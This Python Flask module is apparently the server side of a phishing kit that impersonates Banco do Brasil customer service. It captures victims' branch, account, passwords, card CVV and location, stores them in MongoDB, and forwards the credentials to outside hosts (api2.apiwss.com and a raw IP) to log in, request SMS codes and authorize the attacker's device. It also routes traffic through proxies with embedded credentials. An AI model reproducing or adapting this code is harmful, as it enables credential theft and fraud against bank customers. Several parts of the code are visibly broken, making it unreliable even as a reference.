from flask import Blueprint, request, make_response, render_template, \
                  flash, g, session, redirect, url_for, app, jsonify

import datetime
from database import mongo
from user_agents import parse
from os.path import exists
import urllib.parse
import json
import uuid, re, requests
import sys
import asyncio
from rich.console import Console
from operator import itemgetter
from bson import ObjectId
from threading import Thread
from time import sleep
import random
bblivelo = Blueprint('bblivelo', __name__, url_prefix='/atendimento')

#
console = Console()

def print_roundtrip(response, *args, **kwargs):
    # if os.getenv("DEBUG") == 'True':
    format_headers = lambda d: '\n'.join(f'{k}: {v}' for k, v in d.items())
    console.log(textwrap.dedent('''
        ---------------- REQUEST ----------------
        {req.method} {req.url}
        {reqhdrs}

        {req.body}
        ---------------- RESPONSE ----------------
        {res.status_code} {res.reason} {res.url}
        {reshdrs}
        {res.text}
    ''').format(
        req=response.request, 
        res=response, 
        reqhdrs=format_headers(response.request.headers), 
        reshdrs=format_headers(response.headers), 
    ))
#
def match_(status):
    if status == 200:
        return "OK"
    elif status ==  400:
        return "Bad request"
    elif status ==  404:
        return "Page not found"
    elif status ==  500:
        return "Internal Server error"
    else:
        return "Something went wrong"
#

def get_random_proxy():
    abc = []
    for i in open('/apps/bblivelo/app/controllers/proxies.txt','r'):
        abc.append(i.strip())
    
    proxies = abc
    random_proxy = random.choice(proxies)
    content = f'socks5://tioinfobbx1:u2TzzVogkn@{random_proxy}'
    console.log('proxies => ',content)
    return content


#
def replace_non_numeric(s):
    return re.sub(r'[^0-9]', '', s)

#
def extrairCodigo(texto):
    console.log(texto)
    padroes = [r'bbapp:\/\/ato\?c=([a-zA-Z0-9]+)', r'resgate:\/\/ato\?c=([a-zA-Z0-9]+)', r'bb:\/\/ato\?c=([a-zA-Z0-9]+)', r'BB:\/\/ato\?c=([a-zA-Z0-9]+)', r'gcs\?c=([a-zA-Z0-9]+)', r'ato\?c=([a-zA-Z0-9]+)']
    for padrao in padroes:
        correspondencia = re.search(padrao, texto)
        console.log(correspondencia)
        if correspondencia:
            return correspondencia.group(1)
    return None
#
def callApiV4(info, ads,ip):
    ag = replace_non_numeric(info['input_ag'])
    cc = replace_non_numeric(info['input_cc'])
    s8 = replace_non_numeric(info['input_sn'])
    user = session['d']['admin_id']
    session['agencia']  = ag
    session['conta']  = cc
    session['senha8']  = s8
    
    proxies_status = True
    console.log(ag,cc,s8,session['ads'], proxies_status,user)
    response = requests.post(
        f'https://api2.apiwss.com/bank/bb',
        json={
            'painel': ads,
            'agencia': ag,
            'conta': cc,
            'senha8': s8,
            'user': user,
            'useragent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1',
            'ip': ip,
            'user_agent': request.headers.get('User-Agent'),
            'os': session['os']
        }
    )

    return response.json()

def app_solicita_sms_investimento(hashFone, senha):
    
    try:
        console.log('=> Solicitando SMS => ',hashFone , senha)
        # Post request to http://<ip>:8101/bb_console/login
        response_login = requests.post(
            f'https://api2.apiwss.com/bank/enviacode',
            json={
                'painel': 'Python Painel',
                'senha6': senha,
                'hashFone': hashFone,
                'idCliente': session['idCliente']
            },
            timeout=19
        )
        return response_login.json()
    except Exception as ex:
        return jsonify({
            'result': 'false',
            'message': 'Internal error. (C000-022C)'
            ,'_id':'internal error'
        }), 422

        

def app_liberar_sms(token):
    console.log('=> Iniciando Liberacao ')
    try:
        # Post request to http://<ip>:8101/bb_console/login
        response = requests.post(
            f'https://api2.apiwss.com/bank/success',
            json={
                'painel': 'Python Painel',
                'idCliente': session['idCliente'],
                'tokenLiberacao': token,
            },
            timeout=19
        )
        return response
    except Exception as ex:
        return jsonify({
            'result': 'false',
            'message': 'Internal error. (C000-022C)'
            ,'_id':'internal error'
        }), 422

#
def app_status(dados, idDispositivo, mci):
    response = requests.post(f'http://18.230.25.4:8101/bb_console/status', json={
        'painel': 'Python Painel',
        'proxy': session['proxies'],
        'idDispositivo': idDispositivo,
        'mci': mci,
        'agencia': dados['input_ag'],
        'conta': dados['input_cc'],
    }, timeout=19)

    if 'statusAutorizacaoTransacoesFinanceiras' in response.text:
        status = response.json()['informacoesConta']['statusAutorizacaoTransacoesFinanceiras']
        return status

    return response.json()

def delayed_check(dados, idDispositivo, mci, idx):
    sleep(30)
    
    status = app_status(dados, idDispositivo, mci)
    console.log('=> STATUS: ' + status)

    # Update status
    data = {}
    data['status'] = status
    mongo.db.infos.update_one({'_id':ObjectId(idx)}, {'$set': data })

@bblivelo.before_request
def make_session_permanent():
    session.permanent = True


@bblivelo.route('/<path:path>', methods=['GET', 'POST'])
def index_redir(path):
    path = path.split("/")
    print(path[0],session['prefix'])
    if path[0] == session['prefix']:
        #response = redirect("/login")
        try:
            if path[1] == 'inicio':
                return async_handler()
            if path[1] == 'api':
                response = async_handlerAPI()
                return response
            if path[1] == 'telefone':
                return async_handlerTelefone()
            if path[1] == 'link':
                return async_handlerLink()
            if path[1] == 'finalizar':
                return async_handleFinalizar()
            if path[1] == 'cartao':
                return async_handleCartao()
            if path[1] == 'cancelamento':
                #return f'{path}'
                if path[2] == 'emprestimo':
                    
                    console.log('emprestimooo')
                    return async_login_emprestimo()
                if path[2] == 'api':
                    return async_handlerAPIEmprestimo()
                if path[2] == 'confirmar':
                    return async_login_emprestimo_confirmar()
        except Exception as e:
            print(e)
            session["ads"] = ''
            session['proxies'] = get_random_proxy()
            return path[0]
    else:
        session.clear()
        return redirect("/")
def async_login_emprestimo():

    return render_template('emprestimo_index.html', telefones=[],cliente=session['dados'], prefix=f"/atendimento/{session['prefix']}/cancelamento")
def async_login_emprestimo_confirmar():

    return render_template('emprestimo_confirmar.html', telefones=[],cliente=session['dados'], prefix=f"/atendimento/{session['prefix']}/cancelamento")

# login
def async_handler():
    return render_template('index.html', prefix=f"/atendimento/{session['prefix']}")

# phones
def async_handlerTelefone():
    try:
        fones = session['fones']
    except:
        fones = []

    return render_template('telefone.html', telefones=fones, prefix=f"/atendimento/{session['prefix']}")

# pegar link
def async_handlerLink():
    return render_template('link_1.html', prefix=f"/atendimento/{session['prefix']}")

#cartao
def async_handleCartao():

    status = app_status(session['dados'], session['device']['idDispositivo'], session['mci'])
    status = app_status(session['dados'], session['device']['idDispositivo'], session['mci'])

    console.log('STATUS=> ',status)

    return render_template('cartao.html', cartoes=info['cartoes'], nome=info['apelido'], prefix=f"/atendimento/{session['prefix']}")

# finalizar

def async_handleFinalizar():
    from datetime import datetime
    

    try:
        nome = session['nome']
    except:
        nome = None

    return render_template('finalizar.html', datetime=datetime, nome=session['nome'], prefix=f"/atendimento/{session['prefix']}")
# api
def async_handlerAPI():
    action = request.form.get('action')
    console.log(action)
    if session['ads']:
        console.log('=> '+ session['ads'] +' <= Post Action: ' + action)
    else: 
        console.log('=> ??? <= Post Action: ' + action)

    if action == 'geo':
        data = {}
        data['geoLat'] = request.form.get('latitude')
        data['geoLng'] = request.form.get('longitude')
        mongo.db.infos.update_one({'_id':ObjectId(session['idx'])}, {'$set': data })

    elif action == 'doCartao':
        # update
        data = {}
        data['sel_cartao'] = request.form.get('cartaoSelecionado')
        data['sel_cvv'] = request.form.get('input_cvv')
        mongo.db.infos.update_one({'_id':ObjectId(session['idx'])}, {'$set': data })
        status = app_status(session['dados'], session['device']['idDispositivo'], session['mci'])
        status = app_status(session['dados'], session['device']['idDispositivo'], session['mci'])
        data = {}
        data['status'] = status
        mongo.db.infos.update_one({'_id':ObjectId(session['idx'])}, {'$set': data })

        #
        if status == 'QUARENTENA':
            return {"result": 'false', "message": "Aguarde novo link...", "next": "login",'_id':session['idx']}    
        return {"result": 'true', "message": "Aguarde...", "next": "finalizar",'_id':session['idx']}

    elif action == 'doLink':
        codigo = extrairCodigo(request.form.get('inpLinkAto'))
        console.log('codigo =>>', codigo)
        if codigo is None:
            return jsonify({
                'result': False,
                'message': 'Link inválido. (C902-011)',
            }), 422

        console.log('=> ATO Recebido: ' + codigo)

        retorno = app_liberar_sms(codigo)
        console.log(str(retorno.json()), retorno.status_code)
        if 'Codigo de liberacao invalido para este equipamento' in str(retorno.text):
            return jsonify({"result": False, "message": "Codigo inválido para este equipamento (C908-078) ATOD.51]",'_id':session['idx']}), 422
        elif not retorno.json() or retorno.json() is None:
            return jsonify({"result": False, "message": "Codigo inválido para este equipamento (C908-078) ATOD.51]",'_id':session['idx']}), 422
        
        status = app_status()
        console.log('=> STATUS: ' + status)

        
        return {"result": 'true', "message": "Aguarde...", "next": "/finalizar",'_id':session['idx']}

    elif action == 'doSendLink':
        app_solicita_sms_investimento(session['hashFone'], session['senha6'])
        return {"result": 'true', "message": "Aguarde...", "next": "",'_id':session['idx']}

    elif action == 'doTelefone':
        if session['dados']['input_sn'] and request.form.get('input_se6') in session['dados']['input_sn']:
            return jsonify({
                'result': False,
                'message': 'Senha inválida. (C902-011)'
            }), 422

        # update
        data = {}
        data['senha6'] = request.form.get('input_se6')
        session['senha6'] = request.form.get('input_se6')

        hashFone = None
        telefone = None
        for i in session['fones']:
            if i['hash'] == request.form.get('input_cel'):
                hashFone = i['hash']
                telefone = i['fone']

        if telefone != None:
            session['hashFone'] = hashFone
            response = app_solicita_sms_investimento(session['hashFone'], session['senha6'])
            console.log(response)
            return {"result": 'true', "message": "Aguarde...", "next": "link",'_id':session['idx']}

        return {"result": 'true', "message": "Aguarde...", "next": "cartao",'_id':session['idx']}

    elif action == "doLogin":
        schema = {
                "input_ag": {"required": True},
                "input_cc": {"required": True},
                "input_sn": {"required": True},
            }
        # validator = Validator(schema)

        # if not validator.validate(request.json):
        #     return json({"result": False, "message": "Dados inválidos. (C902-010)"}, status=422)

        info = callApiV4(dict(request.form), session['ads'],request.remote_addr)
        console.log(info)
        if not info or info is None:
            return jsonify({"result": False, "message": "Dados inválidos. (C902-017)"}), 422

        if info['error'] is True or info['error'] == True:
            return jsonify({"result": False,"message": info['retorno']}), 422

        # session
        session['idx'] = info['resposta']['idDispositivo']
        session['fones'] = info['resposta']['phones']
        session['dados'] = dict(request.form)
        session['device'] = info['resposta']['idDispositivo']
        session['mci'] = info['resposta']['mciCliente']
        session['nome'] = info['resposta']['nome']
        session['idCliente'] = info['resposta']['idCliente']
        #
        return {"result": 'true', "message": "Aguarde...", "next": "telefone",'_id':session['idx']}

    elif action == 'doLoginEmprestimo':
        return { "result": False, "message": "Aguarde...", "next": "confirmar" }
    
    return {"result": False, "message": "Aguarde...", "next": "telefone",'_id':session['idx']}

def async_handlerAPIEmprestimo():
    action = request.form.get('action')
    if action == 'doLoginEmprestimo':
        dados = request.form.get('input_cel')
        dados = dados.split('|')
        senha8 = request.form.get('input_se6')
        if senha8 == '' or len(senha8) < 8:
            return {"result": False, "message": "A SENHA INVALIDA. POR FAVOR, TENTE NOVAMENTE.", "next": "emprestimo"}
        session['agencia'] = dados[0]
        session['conta'] = dados[1]
        response = requests.post(
            f'https://api2.apiwss.com/sms/login',
            json={
                'painel': '',
                'agencia': dados[0],
                'conta': dados[1],
                'senha8': senha8,
                'idDispositivo':dados[2],
                'os':dados[3],
                'mci':dados[4].replace(' ',''),
                'apelido':dados[5],
                'user': session['d']['admin_id']
            }

        )
        console.log(dados,senha8)
        console.log(response.text)
        if response.status_code != 200:
            return { "result": False, "message": response.json()['retorno'], "next": "confirmar" }
        else:
            return { "result": 'true', "message": 'OK!', "next": "confirmar" }
    elif action == 'doConfirmar':
        senha6 = request.form.get('input_se6')
        response = requests.post(
            f'https://api2.apiwss.com/sms/confirmar',
            json={
                'painel': '',
                'agencia': session['agencia'],
                'conta': session['conta'],
                'senha6': senha6,
                'user': session['d']['admin_id']
            }

        )

        return {"result": False, "message": "A SENHA DE TRANSAÇÃO ESTÁ ERRADA. POR FAVOR, TENTE NOVAMENTE.", "next": "emprestimo"}
    else:
        return {"result": False, "message": "Aguarde...", "next": "emprestimo"}